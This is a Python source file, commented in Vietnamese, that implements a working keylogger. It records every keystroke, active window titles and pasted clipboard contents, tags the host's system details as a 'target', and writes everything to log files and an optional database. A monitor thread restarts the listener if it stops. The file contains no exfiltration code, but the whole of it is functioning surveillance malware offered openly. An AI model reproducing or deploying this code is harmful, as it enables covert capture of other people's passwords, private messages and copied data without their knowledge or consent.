#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module xử lý chức năng theo dõi bàn phím với khả năng xử lý lỗi nâng cao
"""

import os
import sys
import time
import threading
import logging
import traceback
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple, Union, Callable

# Thiết lập logging cơ bản
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("keylogger_debug.log"),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger("keylogger.core")

# Cẩn thận với các import, kiểm tra và cung cấp fallback
try:
    import pynput.keyboard

    PYNPUT_AVAILABLE = True
except ImportError:
    logger.error("Thư viện pynput chưa được cài đặt. Vui lòng cài đặt: pip install pynput")
    PYNPUT_AVAILABLE = False

try:
    import pyperclip

    PYPERCLIP_AVAILABLE = True
except ImportError:
    logger.warning("Thư viện pyperclip không khả dụng, chức năng clipboard sẽ bị vô hiệu")
    PYPERCLIP_AVAILABLE = False
    pyperclip = None

# Cung cấp class mặc định cho các module phụ thuộc nếu chúng không tồn tại
try:
    from core.database import Database

    DATABASE_AVAILABLE = True
except ImportError:
    logger.warning("Module core.database không khả dụng, sẽ sử dụng class giả")
    DATABASE_AVAILABLE = False


    # Class Database giả
    class Database:
        def __init__(self, *args, **kwargs):
            self.logger = logging.getLogger("keylogger.fake_database")
            self.logger.warning("Sử dụng database giả, dữ liệu sẽ không được lưu trữ")

        def add_target(self, system_info):
            self.logger.info("add_target giả được gọi")
            return 1  # ID giả

        def add_conversation(self, *args, **kwargs):
            self.logger.info("add_conversation giả được gọi")
            return True

        def add_keystrokes_batch(self, keystrokes):
            self.logger.info(f"add_keystrokes_batch giả được gọi với {len(keystrokes)} keystroke")
            return True

        def add_conversations_batch(self, conversations):
            self.logger.info(f"add_conversations_batch giả được gọi với {len(conversations)} conversation")
            return True

try:
    from core.system_info import SystemInfo

    SYSTEMINFO_AVAILABLE = True
except ImportError:
    logger.warning("Module core.system_info không khả dụng, sẽ sử dụng class giả")
    SYSTEMINFO_AVAILABLE = False


    # Class SystemInfo giả
    class SystemInfo:
        @staticmethod
        def get_system_info():
            # Thử detect OS và hostname
            import platform
            import socket

            try:
                hostname = socket.gethostname()
            except:
                hostname = "unknown"

            return {
                "os": platform.system(),
                "version": platform.version(),
                "hostname": hostname,
                "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }

        @staticmethod
        def get_active_window_title():
            try:
                import platform
                system = platform.system()

                # Windows
                if system == 'Windows':
                    import win32gui
                    window = win32gui.GetForegroundWindow()
                    return win32gui.GetWindowText(window)

                # Linux (requires xprop)
                elif system == 'Linux':
                    import subprocess
                    try:
                        window_id = subprocess.check_output(
                            ['xprop', '-root', '_NET_ACTIVE_WINDOW'],
                            universal_newlines=True
                        ).strip().split()[-1]

                        window_title = subprocess.check_output(
                            ['xprop', '-id', window_id, 'WM_NAME'],
                            universal_newlines=True
                        ).strip().split('=', 1)[-1].strip('" ')

                        return window_title
                    except:
                        return "Unknown Window (Linux)"

                # macOS
                elif system == 'Darwin':
                    try:
                        import subprocess
                        apple_script = 'tell application "System Events"' + \
                                       'set frontApp to name of first application process whose frontmost is true' + \
                                       'end tell'
                        window = subprocess.check_output(
                            ['osascript', '-e', apple_script],
                            universal_newlines=True
                        ).strip()
                        return window
                    except:
                        return "Unknown Window (macOS)"

                return "Unknown Window"
            except Exception as e:
                logger.error(f"Lỗi khi lấy tiêu đề cửa sổ: {str(e)}")
                return "Unknown Window"


class Keylogger:
    """Class theo dõi và ghi lại hoạt động bàn phím với xử lý lỗi nâng cao."""

    def __init__(
            self,
            log_file: str,
            callback: Optional[Callable] = None,
            database: Optional[Database] = None,
    ):
        """Khởi tạo đối tượng Keylogger.

        Args:
            log_file: Đường dẫn lưu file log
            callback: Hàm callback khi có keystroke mới (tùy chọn)
            database: Đối tượng Database để lưu trữ dữ liệu (tùy chọn)
        """
        if not PYNPUT_AVAILABLE:
            raise ImportError("Thư viện pynput không khả dụng, không thể khởi tạo Keylogger")

        # Tạo thư mục chứa file log nếu chưa tồn tại
        try:
            log_dir = os.path.dirname(os.path.abspath(log_file))
            os.makedirs(log_dir, exist_ok=True)
        except Exception as e:
            logger.error(f"Lỗi khi tạo thư mục log: {e}")
            # Fallback đến thư mục hiện tại
            log_file = os.path.basename(log_file)

        # Khởi tạo biến cơ bản
        self.log_file = log_file
        self.callback = callback
        self.database = database if database else (Database() if DATABASE_AVAILABLE else None)
        self._listener = None
        self.running = False
        self.target_id = None
        self.last_error = None
        self.error_count = 0
        self.max_consecutive_errors = 5

        # Logger
        self.logger = logging.getLogger("keylogger.instance")

        # Theo dõi input
        self.current_window = ""
        self.last_window = ""
        self.current_text = ""
        self.currently_pressed = set()
        self.is_ctrl_pressed = False
        self.is_shift_pressed = False
        self.is_alt_pressed = False

        # Thời gian kết thúc đoạn hội thoại
        self.idle_threshold = 2.0  # Giây không gõ để kết thúc đoạn
        self.last_keystroke_time = time.time()

        # Phát hiện clipboard
        self.clipboard_content = ""
        self.last_clipboard_content = ""
        self.last_paste_time = 0
        self.paste_cooldown = 0.5  # Tránh paste liên tục

        # Buffer cho keystroke để cải thiện hiệu suất
        self.keystroke_buffer = []
        self.conversation_buffer = []
        self.max_buffer_size = 20  # Số keystroke tối đa trước khi flush
        self.last_flush_time = time.time()
        self.flush_interval = 5.0  # Giây

        # Event để thông báo dừng thread
        self.stop_event = threading.Event()

        # Thread monitor (kiểm tra liên tục xem listener có hoạt động)
        self.monitor_thread = None
        self.last_activity_time = time.time()
        self.monitor_interval = 10.0  # seconds

        # Ghi thông tin khởi tạo
        self._write_to_log(f"=== KEYLOGGER INITIALIZED AT {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===")

        # Lưu thông tin hệ thống
        self._save_system_info()

    def _save_system_info(self):
        """Lưu thông tin hệ thống vào log và database"""
        try:
            system_info = SystemInfo.get_system_info()
            self._write_to_log("=== THÔNG TIN HỆ THỐNG ===")
            for key, value in system_info.items():
                self._write_to_log(f"{key}: {value}")
            self._write_to_log("=========================\n")

            # Lưu vào database nếu có
            if self.database:
                try:
                    self.target_id = self.database.add_target(system_info)
                    self.logger.info(f"Đã đăng ký target_id: {self.target_id}")
                except Exception as e:
                    self.logger.error(f"Lỗi khi lưu thông tin hệ thống vào database: {e}")
                    self.target_id = 1  # ID mặc định
        except Exception as e:
            self.logger.error(f"Lỗi khi lưu thông tin hệ thống: {e}")
            self._write_to_log(f"Error khi lưu thông tin hệ thống: {str(e)}")

    def _write_to_log(self, message, newline=True):
        """Ghi thông điệp vào file log với xử lý lỗi"""
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(message)
                if newline:
                    f.write("\n")
            return True
        except Exception as e:
            self.logger.error(f"Lỗi khi ghi vào file log: {e}")
            # Thử ghi vào thư mục hiện tại
            try:
                fallback_log = f"keylogger_fallback_{datetime.now().strftime('%Y%m%d')}.log"
                with open(fallback_log, "a", encoding="utf-8") as f:
                    f.write(f"[Fallback log] {message}\n")
                self.log_file = fallback_log  # Chuyển sang dùng file fallback
                return True
            except:
                # Nếu tất cả đều thất bại, chỉ ghi log và trả về false
                self.logger.critical("KHÔNG THỂ GHI VÀO BẤT KỲ FILE LOG NÀO!")
                return False

    def _safe_get_window_title(self):
        """Lấy tiêu đề cửa sổ hiện tại một cách an toàn"""
        try:
            return SystemInfo.get_active_window_title()
        except Exception as e:
            self.logger.error(f"Lỗi khi lấy tiêu đề cửa sổ: {e}")
            return "Unknown Window"

    def _on_press(self, key) -> None:
        """Xử lý sự kiện nhấn phím với xử lý lỗi."""
        if self.stop_event.is_set():
            return False  # Dừng listener

        try:
            # Cập nhật thời gian hoạt động
            self.last_activity_time = time.time()

            # Cập nhật thời gian nhấn phím gần nhất
            current_time = time.time()
            time_since_last = current_time - self.last_keystroke_time
            self.last_keystroke_time = current_time

            # Kiểm tra và kết thúc đoạn hội thoại nếu đã quá thời gian chờ
            if time_since_last > self.idle_threshold and self.current_text.strip():
                self._end_conversation()

            # Lấy tiêu đề cửa sổ hiện tại
            new_window = self._safe_get_window_title()

            # Nếu cửa sổ thay đổi, lưu đoạn hội thoại hiện tại và bắt đầu đoạn mới
            if new_window != self.current_window and self.current_text.strip():
                self._end_conversation()

            # Cập nhật cửa sổ hiện tại
            self.current_window = new_window

            # Chuẩn bị key_char mặc định
            if hasattr(key, "char") and key.char is not None:
                key_char = key.char
            else:
                key_name = key.name if hasattr(key, 'name') and key.name else str(key)
                key_char = f"<{key_name}>"

            # Xử lý phím đặc biệt
            if hasattr(key, 'name') and key.name:
                key_name = key.name.lower()

                # Theo dõi phím modifier
                if key_name in ('ctrl', 'ctrl_l', 'ctrl_r'):
                    self.is_ctrl_pressed = True
                    self.currently_pressed.add('ctrl')

                elif key_name in ('shift', 'shift_l', 'shift_r'):
                    self.is_shift_pressed = True
                    self.currently_pressed.add('shift')

                elif key_name in ('alt', 'alt_l', 'alt_r', 'alt_gr'):
                    self.is_alt_pressed = True
                    self.currently_pressed.add('alt')

                # Xử lý phím đặc biệt
                elif key_name == 'enter':
                    self.current_text += "\n"
                    self._end_conversation()

                elif key_name == 'space':
                    self.current_text += " "

                elif key_name == 'tab':
                    self.current_text += "\t"

                elif key_name == 'backspace' and self.current_text:
                    self.current_text = self.current_text[:-1]

                elif key_name == 'delete':
                    # Xử lý delete khác tùy context
                    pass

                # Phím ESC
                elif key_name == 'esc':
                    pass  # Có thể xử lý đặc biệt

                # Chức năng copy
                elif key_name == 'c' and self.is_ctrl_pressed:
                    key_char = "<COPY>"

                # Chức năng paste
                elif key_name == 'v' and self.is_ctrl_pressed:
                    key_char = "<PASTE>"
                    self._capture_clipboard()

                # Phím hàm F1-F12
                elif key_name.startswith('f') and key_name[1:].isdigit():
                    pass  # Có thể xử lý đặc biệt

            # Xử lý ký tự thông thường
            elif hasattr(key, 'char') and key.char is not None:
                self.current_text += key.char

            # Ghi nhận keystroke và timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

            # Thêm vào buffer
            self.keystroke_buffer.append(
                (self.target_id, timestamp, key_char, self.current_window)
            )

            # Kiểm tra nếu cần flush
            if (len(self.keystroke_buffer) >= self.max_buffer_size or
                    current_time - self.last_flush_time >= self.flush_interval):
                self._flush_buffer()

            # Reset error count vì xử lý thành công
            self.error_count = 0

            return True  # Tiếp tục theo dõi

        except Exception as e:
            self.error_count += 1
            self.last_error = str(e)
            error_info = traceback.format_exc()
            self.logger.error(f"Lỗi khi xử lý keystroke: {e}\n{error_info}")

            # Nếu quá nhiều lỗi liên tiếp, có thể có vấn đề nghiêm trọng
            if self.error_count >= self.max_consecutive_errors:
                self.logger.critical(
                    f"Đã phát hiện {self.error_count} lỗi liên tiếp. Đang tự khởi động lại listener...")
                self._restart_listener()

            return True  # Vẫn giữ listener hoạt động

    def _on_release(self, key) -> None:
        """Xử lý sự kiện thả phím."""
        try:
            # Cập nhật thời gian hoạt động
            self.last_activity_time = time.time()

            # Xử lý phím đặc biệt
            if hasattr(key, 'name') and key.name:
                key_name = key.name.lower()

                # Theo dõi phím Ctrl
                if key_name in ('ctrl', 'ctrl_l', 'ctrl_r'):
                    self.is_ctrl_pressed = False
                    if 'ctrl' in self.currently_pressed:
                        self.currently_pressed.remove('ctrl')

                # Theo dõi phím Shift
                elif key_name in ('shift', 'shift_l', 'shift_r'):
                    self.is_shift_pressed = False
                    if 'shift' in self.currently_pressed:
                        self.currently_pressed.remove('shift')

                # Theo dõi phím Alt
                elif key_name in ('alt', 'alt_l', 'alt_r', 'alt_gr'):
                    self.is_alt_pressed = False
                    if 'alt' in self.currently_pressed:
                        self.currently_pressed.remove('alt')

        except Exception as e:
            self.logger.error(f"Lỗi khi xử lý release key: {e}")

    def _capture_clipboard(self) -> None:
        """Capture nội dung clipboard khi phát hiện Ctrl+V"""
        if not PYPERCLIP_AVAILABLE:
            return

        try:
            # Tránh capture quá nhiều lần trong thời gian ngắn
            current_time = time.time()
            if current_time - self.last_paste_time < self.paste_cooldown:
                return

            self.last_paste_time = current_time

            clipboard_content = pyperclip.paste()
            if clipboard_content and clipboard_content != self.last_clipboard_content:
                self.last_clipboard_content = clipboard_content

                # Lưu vào log
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                paste_entry = f"[{timestamp}] [{self.current_window}] [PASTE] {clipboard_content}"
                self._write_to_log(paste_entry)

                # Thêm vào buffer conversation
                self.conversation_buffer.append(
                    (timestamp, self.current_window, f"[PASTE] {clipboard_content}")
                )

                # Gọi callback nếu có
                if self.callback:
                    try:
                        self.callback(paste_entry)
                    except Exception as cb_e:
                        self.logger.error(f"Lỗi trong callback: {cb_e}")

        except Exception as e:
            self.logger.error(f"Lỗi khi capture clipboard: {e}")

    def _end_conversation(self) -> None:
        """Kết thúc đoạn hội thoại hiện tại và lưu"""
        if not self.current_text.strip():
            return

        try:
            # Lưu đoạn hội thoại
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            conversation_entry = f"[{timestamp}] [{self.current_window}] {self.current_text}"
            self._write_to_log(conversation_entry)

            # Thêm vào buffer conversation
            self.conversation_buffer.append(
                (timestamp, self.current_window, self.current_text)
            )

            # Ghi vào database
            if self.database and self.target_id:
                try:
                    self.database.add_conversation(
                        self.target_id, timestamp, self.current_window, self.current_text
                    )
                except Exception as db_e:
                    self.logger.error(f"Lỗi khi ghi conversation vào database: {db_e}")

            # Gọi callback nếu có
            if self.callback:
                try:
                    self.callback(conversation_entry)
                except Exception as cb_e:
                    self.logger.error(f"Lỗi trong callback: {cb_e}")

            # Reset đoạn hội thoại
            self.current_text = ""

            # Flush buffer nếu cần
            current_time = time.time()
            if (len(self.conversation_buffer) >= self.max_buffer_size or
                    current_time - self.last_flush_time >= self.flush_interval):
                self._flush_buffer()

        except Exception as e:
            self.logger.error(f"Lỗi khi kết thúc hội thoại: {e}")
            # Reset text bất kể lỗi
            self.current_text = ""

    def _flush_buffer(self) -> None:
        """Ghi buffer keystroke và conversation vào file và database."""
        if not (self.keystroke_buffer or self.conversation_buffer):
            return

        try:
            # Ghi vào database
            if self.database and self.target_id:
                try:
                    if self.keystroke_buffer:
                        self.database.add_keystrokes_batch(self.keystroke_buffer)

                    if self.conversation_buffer:
                        # Chuyển đổi format cho conversations
                        db_conversations = [(self.target_id, timestamp, window, text)
                                            for timestamp, window, text in self.conversation_buffer]
                        self.database.add_conversations_batch(db_conversations)
                except Exception as db_e:
                    self.logger.error(f"Lỗi khi ghi batch vào database: {db_e}")

            # Xóa buffer và cập nhật thời gian
            self.keystroke_buffer.clear()
            self.conversation_buffer.clear()
            self.last_flush_time = time.time()

        except Exception as e:
            self.logger.error(f"Lỗi khi flush buffer keystroke: {e}")
            # Thử ghi vào file lỗi
            try:
                with open(f"{self.log_file}.error.log", "a", encoding="utf-8") as error_file:
                    error_file.write(
                        f"[ERROR] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Flush error: {str(e)}\n")
            except:
                pass  # Không làm gì nếu ghi file lỗi cũng thất bại

    def _monitor_listener(self):
        """Thread giám sát listener để đảm bảo nó đang hoạt động"""
        while not self.stop_event.is_set():
            try:
                time.sleep(self.monitor_interval)

                # Kiểm tra nếu listener không còn hoạt động
                current_time = time.time()
                if (current_time - self.last_activity_time > self.monitor_interval * 2 and
                        self.running and
                        (self._listener is None or not self._listener.is_alive())):
                    self.logger.warning("Phát hiện listener không hoạt động, đang khởi động lại...")
                    self._restart_listener()
            except Exception as e:
                self.logger.error(f"Lỗi trong monitor thread: {e}")

    def _restart_listener(self):
        """Khởi động lại listener nếu có vấn đề"""
        try:
            # Dừng listener cũ nếu còn tồn tại
            if self._listener:
                try:
                    self._listener.stop()
                except:
                    pass

            # Khởi tạo listener mới
            self._listener = pynput.keyboard.Listener(
                on_press=self._on_press,
                on_release=self._on_release
            )
            self._listener.daemon = True
            self._listener.start()

            # Reset biến theo dõi lỗi
            self.error_count = 0
            self.last_activity_time = time.time()

            self.logger.info("Listener đã được khởi động lại thành công")
            self._write_to_log(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] === LISTENER RESTARTED ===")

        except Exception as e:
            self.logger.critical(f"Không thể khởi động lại listener: {e}")
            # Đánh dấu không chạy nếu không khởi động lại được
            self.running = False

    def start(self) -> None:
        """Bắt đầu theo dõi bàn phím."""
        if self.running:
            self.logger.warning("Keylogger đã đang chạy.")
            return

        try:
            if not PYNPUT_AVAILABLE:
                self.logger.error("Không thể bắt đầu: pynput không khả dụng")
                return

            self.running = True
            self.stop_event.clear()

            # Khởi tạo listener
            self._listener = pynput.keyboard.Listener(
                on_press=self._on_press,
                on_release=self._on_release
            )
            self._listener.daemon = True
            self._listener.start()

            # Khởi động thread monitor
            self.monitor_thread = threading.Thread(target=self._monitor_listener)
            self.monitor_thread.daemon = True
            self.monitor_thread.start()

            # Cập nhật thời gian hoạt động
            self.last_activity_time = time.time()

            # Ghi log start
            self._write_to_log(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] === KEYLOGGER STARTED ===")

            self.logger.info("Keylogger đã bắt đầu.")
        except Exception as e:
            self.running = False
            self.logger.error(f"Lỗi khi khởi động keylogger: {e}")
            # Thử ghi thông tin lỗi vào file
            self._write_to_log(f"[ERROR] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Start error: {str(e)}")
            raise

    def stop(self) -> None:
        """Dừng theo dõi bàn phím."""
        if not self.running:
            self.logger.warning("Keylogger không đang chạy.")
            return

        try:
            # Kết thúc đoạn hội thoại hiện tại nếu có
            if self.current_text.strip():
                self._end_conversation()

            # Đặt cờ dừng và flush buffer
            self.stop_event.set()
            self._flush_buffer()

            # Dừng listener
            if self._listener:
                try:
                    self._listener.stop()

                    # Chờ thread listener kết thúc với timeout
                    if hasattr(self._listener, "join"):
                        self._listener.join(timeout=2.0)
                except Exception as e:
                    self.logger.error(f"Lỗi khi dừng listener: {e}")

            # Chờ monitor thread kết thúc
            if self.monitor_thread and self.monitor_thread.is_alive():
                try:
                    self.monitor_thread.join(timeout=2.0)
                except Exception as e:
                    self.logger.error(f"Lỗi khi dừng monitor thread: {e}")

            self.running = False

            # Ghi log stop
            self._write_to_log(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] === KEYLOGGER STOPPED ===")

            self.logger.info("Keylogger đã dừng.")
        except Exception as e:
            self.logger.error(f"Lỗi khi dừng keylogger: {e}")
            # Chắc chắn đánh dấu là đã dừng
            self.running = False

    def set_buffer_size(self, size: int) -> None:
        """Thiết lập kích thước buffer."""
        if size > 0:
            self.max_buffer_size = size

    def set_flush_interval(self, interval: float) -> None:
        """Thiết lập thời gian flush buffer."""
        if interval > 0:
            self.flush_interval = interval

    def set_idle_threshold(self, threshold: float) -> None:
        """Thiết lập ngưỡng thời gian không hoạt động."""
        if threshold > 0:
            self.idle_threshold = threshold

    def get_status(self) -> Dict[str, Any]:
        """Trả về trạng thái hiện tại của keylogger"""
        return {
            "running": self.running,
            "listener_active": self._listener is not None and self._listener.is_alive() if self._listener else False,
            "target_id": self.target_id,
            "last_error": self.last_error,
            "error_count": self.error_count,
            "keystrokes_buffered": len(self.keystroke_buffer),
            "conversations_buffered": len(self.conversation_buffer),
            "last_activity": datetime.fromtimestamp(self.last_activity_time).strftime('%Y-%m-%d %H:%M:%S'),
            "last_window": self.current_window
        }


# Chức năng chạy độc lập để kiểm tra
if __name__ == "__main__":
    # Tạo thư mục logs nếu chưa tồn tại
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)

    # Tạo file log với tên chứa timestamp
    log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")


    # Callback đơn giản để in ra console
    def simple_callback(log_entry):
        print(f"Logged: {log_entry.strip()}")


    # Khởi tạo keylogger
    try:
        keylogger = Keylogger(log_file=log_file, callback=simple_callback)

        print(f"Bắt đầu ghi log bàn phím vào file: {log_file}")
        print("Nhấn Ctrl+C để dừng...")
        keylogger.start()

        # Hiển thị trạng thái mỗi 30 giây
        last_status_time = time.time()
        status_interval = 30

        # Giữ chương trình chạy
        while True:
            time.sleep(1)

            # Hiển thị trạng thái định kỳ
            current_time = time.time()
            if current_time - last_status_time > status_interval:
                status = keylogger.get_status()
                print(f"\nTrạng thái keylogger: Running={status['running']}, "
                      f"Listener={status['listener_active']}, "
                      f"Buffer={status['keystrokes_buffered']}, "
                      f"Errors={status['error_count']}")
                last_status_time = current_time

    except KeyboardInterrupt:
        print("\nĐang dừng keylogger...")
    except Exception as e:
        print(f"Lỗi: {str(e)}")
    finally:
        if 'keylogger' in locals():
            keylogger.stop()
            print("Đã dừng keylogger.")